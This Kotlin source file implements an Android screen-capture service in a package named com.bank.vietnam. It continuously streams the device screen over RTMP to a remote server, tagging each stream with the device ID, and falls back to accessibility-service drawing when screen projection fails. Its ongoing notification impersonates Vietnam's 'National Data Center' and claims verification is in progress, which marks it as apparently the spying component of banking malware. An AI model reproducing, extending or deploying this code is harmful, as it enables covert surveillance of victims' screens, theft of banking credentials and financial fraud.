package com.bank.vietnam

import android.annotation.SuppressLint
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.content.res.Resources
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Network
import android.opengl.GLES20
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat.requestPermissions
import androidx.core.app.NotificationCompat
import com.blankj.utilcode.util.ScreenUtils
import com.pedro.common.ConnectChecker
import com.pedro.encoder.input.sources.audio.NoAudioSource
import com.pedro.encoder.input.sources.video.NoVideoSource
import com.pedro.encoder.input.sources.video.ScreenSource
import com.pedro.library.generic.GenericStream
import com.bank.vietnam.Assists.getContext
import com.bank.vietnam.Manager.GenericStreamManager
import com.bank.vietnam.base.R
import com.bank.vietnam.utils.AppConfig
import com.bank.vietnam.utils.BitmapSource
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder
import javax.microedition.khronos.egl.EGL10
import javax.microedition.khronos.egl.EGLConfig
import javax.microedition.khronos.egl.EGLContext
import javax.microedition.khronos.egl.EGLDisplay


/**
 * 屏幕录制服务
 */
class ScreenCaptureService : Service(), ConnectChecker {


 var rData: Intent? = null
 var rCode: Int = 0
    var mediaProjection: MediaProjection? = null

    private val TAG = "ScreenCaptureService"


    companion object {
        private const val CHANNEL_ID = "DisplayStreamChannel"
    }

    private var genericStream: GenericStream? = null

    private val mediaProjectionManager: MediaProjectionManager by lazy {
        applicationContext.getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }
    private var callback: ConnectChecker? = null
    private var isForegroundStarted = false

    override fun onCreate() {
        super.onCreate()
        Log.e("jiujiu", "初始化")
        startServiceIfPermissionGranted()
        Assists.screenCaptureService = this

        Log.d("ScreenCaptureService", "Service started and instance set")

        initializeOpenGLContext()
    }

    fun initializeOpenGLContext() {
        val egl = EGLContext.getEGL() as EGL10
        val display: EGLDisplay = egl.eglGetDisplay(EGL10.EGL_DEFAULT_DISPLAY)

        val version = IntArray(2)
        if (!egl.eglInitialize(display, version)) {
            throw RuntimeException("Failed to initialize EGL.")
        }

        val configs = arrayOfNulls<EGLConfig>(1)
        val numConfig = IntArray(1)
        egl.eglChooseConfig(
            display,
            intArrayOf(
                EGL10.EGL_RENDERABLE_TYPE, 4,  // EGL_OPENGL_ES2_BIT
                EGL10.EGL_NONE
            ),
            configs,
            1,
            numConfig
        )

        val context = egl.eglCreateContext(display, configs[0], EGL10.EGL_NO_CONTEXT, intArrayOf(0x3098, 2, EGL10.EGL_NONE))
        if (context == null || context == EGL10.EGL_NO_CONTEXT) {
            throw RuntimeException("Failed to create OpenGL context.")
        }

        val surface = egl.eglCreatePbufferSurface(display, configs[0], intArrayOf(EGL10.EGL_WIDTH, 1, EGL10.EGL_HEIGHT, 1, EGL10.EGL_NONE))
        if (surface == null || surface == EGL10.EGL_NO_SURFACE) {
            throw RuntimeException("Failed to create surface.")
        }

        if (!egl.eglMakeCurrent(display, surface, surface, context)) {
            throw RuntimeException("Failed to bind OpenGL context.")
        }
    }



    @SuppressLint("ResourceType")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            Log.e(TAG, "onStartCommand received null intent")
            return START_NOT_STICKY
        }

        val localRCode = intent.getIntExtra("rCode", -1)
        val localRData = intent.getParcelableExtra<Intent>("rData")

        if (localRCode != Activity.RESULT_OK || localRData == null) {
            Log.e(TAG, "Invalid resultCode or resultData")
            switchToAccessibilityMode()
            return START_NOT_STICKY
        }

        // ✅ 保存 rCode 和 rData（供独立截图器使用）
        Assists.rCode = localRCode
        Assists.rData = localRData

        // ✅ 停止无障碍绘制（如果启用了）
        Assists.service?.bitmapSource?.stop()

        // ✅ 停止已有推流并释放资源
        GenericStreamManager.genericStream?.let {
            if (it.isStreaming) it.stopStream()
            it.release()
        }
        GenericStreamManager.genericStream = null

        // ✅ 获取分辨率
        val (width, height) = Assists.getFullScreenResolution(this)

        // ✅ 初始化 GenericStream
        genericStream = GenericStreamManager.initializeGenericStream(
            baseContext,
            this,
            height / 3,
            width / 3
        ) ?: run {
            Log.e(TAG, "GenericStream not initialized")
            switchToAccessibilityMode()
            return START_NOT_STICKY
        }

        // ✅ 释放旧 MediaProjection
        mediaProjection?.stop()
        genericStream?.videoSource?.stop()

        mediaProjection = null

        // ✅ 初始化新的 MediaProjection
        mediaProjection = mediaProjectionManager.getMediaProjection(localRCode, localRData)

        if (mediaProjection == null) {
            Log.e(TAG, "Failed to create MediaProjection")
            switchToAccessibilityMode()
            return START_NOT_STICKY
        }


        // ✅ 设置屏幕捕获源
        val screenSource = ScreenSource(applicationContext, mediaProjection!!)
        genericStream?.changeVideoSource(screenSource)

        // ✅ 启动推流
        if (!genericStream!!.isStreaming) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val streamUrl = AppConfig.rtmpUrl + androidId
            genericStream?.startStream(streamUrl)
            Log.d(TAG, "MediaProjection and stream started successfully: $streamUrl")
        } else {
            Log.d(TAG, "Stream already active.")
        }

        return START_STICKY
    }





    private fun switchToAccessibilityMode() {
        val (width, height) = Assists.getFullScreenResolution(this)

        if (GenericStreamManager.genericStream == null) {
            genericStream =
                GenericStreamManager.initializeGenericStream(baseContext, this, height/3, width/3)!!
        }

        // 初始化 BitmapSource 并切换视频源
        Assists.service?.bitmapSource = BitmapSource(Bitmap.createBitmap(width/3, height/3, Bitmap.Config.ARGB_8888))
        genericStream?.changeVideoSource(Assists.service?.bitmapSource!!)

        // 启动流
        if (!genericStream!!.isStreaming) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            genericStream!!.startStream(AppConfig.rtmpUrl+androidId)
            Log.d("ScreenCaptureService", "Switched to Accessibility Drawing Mode")
        }
    }

    private fun startServiceIfPermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14 (API 34)
            val requiredPermission = android.Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION

            // 检查是否已授予权限
            if (checkSelfPermission(requiredPermission) == PackageManager.PERMISSION_GRANTED) {
                // 权限已授予，初始化通知通道并启动服务
                initNotificationChannel()
            } else {
                // 权限未授予，请求权限
            }
        } else {
            // 如果是 Android 14 以下版本，直接初始化通知通道
            initNotificationChannel()
        }
    }


    private fun initNotificationChannel() {
        // 创建通知通道（仅在 Android 8.0 及以上需要）
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Trung tâm dữ liệu quốc gia",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Đang tiến hành xác thực"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }

        // 1) 创建用于启动本应用的 Intent
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
            // 防止重复实例，清空原有任务栈，重新打开应用主界面
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }

        // 2) 用 PendingIntent 封装这个 Intent
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            // 选择合适的 flag，Android 12+ 需考虑是否用 FLAG_IMMUTABLE
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // 构建通知
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Trung tâm dữ liệu quốc gia")
            .setContentText("Đang tiến hành xác thực")
            .setSmallIcon(R.drawable.logo) // 替换为你的通知图标
            .setOngoing(true)
            // 让用户点击通知后打开你的应用
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW) // 优化优先级
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()

        // 启动前台服务
        startForeground(1, notification)
    }





    private fun releaseResources() {
        Log.e(TAG, "xiaohui: ", )

        mediaProjection?.stop()
        mediaProjection = null

    }


    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.e(TAG, "xiaohui: ", )

        releaseResources()  // 确保服务销毁时释放资源
    }

    override fun onConnectionStarted(url: String) {
        Log.e(TAG, "onConnectionStarted: ", )
        callback?.onConnectionStarted(url)
    }

    override fun onConnectionSuccess() {
        Log.e(TAG, "onConnectionSuccess: ", )

        callback?.onConnectionSuccess()
    }

    override fun onNewBitrate(bitrate: Long) {
        callback?.onNewBitrate(bitrate)
    }


    override fun onConnectionFailed(reason: String) {
        Log.e(TAG, "Connection failed: $reason")
        if (genericStream != null) {
            if (genericStream!!.isStreaming) {
                genericStream!!.stopStream()
            }
            genericStream!!.release()
            genericStream = null
            if (Assists.screenCaptureService != null) {
                Assists.screenCaptureService?.stopSelf()
                Assists.screenCaptureService=null
                Assists.service?.bitmapSource?.stop()

                if (GenericStreamManager.genericStream?.isStreaming == true) {
                    GenericStreamManager.genericStream?.stopStream()
                }
                GenericStreamManager.genericStream?.release()

            }
            Log.d(TAG, "GenericStream released")
        }

    }


    override fun onDisconnect() {
        Log.e(TAG, "onDisconnect: ", )

        callback?.onDisconnect()
    }

    override fun onAuthError() {
        Log.e(TAG, "onAuthError: ", )

        callback?.onAuthError()
    }

    override fun onAuthSuccess() {
        Log.e(TAG, "onAuthSuccess: ", )

        callback?.onAuthSuccess()
    }


}
